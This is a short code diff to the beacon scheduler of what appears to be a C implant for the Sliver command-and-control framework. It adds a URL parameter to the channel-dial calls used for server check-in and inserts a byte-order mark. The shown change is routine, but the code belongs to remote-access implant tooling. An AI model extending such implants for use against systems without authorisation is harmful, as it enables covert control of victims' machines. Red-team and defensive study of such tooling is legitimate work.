@@ -1,4 +1,4 @@
-/* src/modes/beacon.c - beacon scheduler (register + periodic check-in).
+﻿/* src/modes/beacon.c - beacon scheduler (register + periodic check-in).
  *
  * Shares everything below the link with the session scheduler: the channel
  * (mTLS + MUX/1 + yamux + signed frames), the envelope codecs, the RPC dispatch
@@ -170,7 +170,7 @@ static int beacon_checkin(const sliver_session_config_t *cfg, const char *id,
   int rc = 0;
 
   err[0] = '\0';
-  if (sliver_channel_dial(cfg->host, cfg->port, cfg->ca_pem, cfg->cert_pem, cfg->key_pem,
+  if (sliver_channel_dial(cfg->url, cfg->host, cfg->port, cfg->ca_pem, cfg->cert_pem, cfg->key_pem,
                           cfg->age_private_key, cfg->server_minisign_pubkey, &ch, err,
                           sizeof(err)) != 0) {
     LOG_WARN("beacon: connect failed: %s", err);
@@ -265,7 +265,7 @@ int sliver_beacon_run(const char *argv0) {
     sliver_channel_t *ch = NULL;
     char err[256];
     err[0] = '\0';
-    if (sliver_channel_dial(cfg.host, cfg.port, cfg.ca_pem, cfg.cert_pem, cfg.key_pem,
+    if (sliver_channel_dial(cfg.url, cfg.host, cfg.port, cfg.ca_pem, cfg.cert_pem, cfg.key_pem,
                             cfg.age_private_key, cfg.server_minisign_pubkey, &ch, err,
                             sizeof(err)) == 0) {
       sliver_buf_t payload;
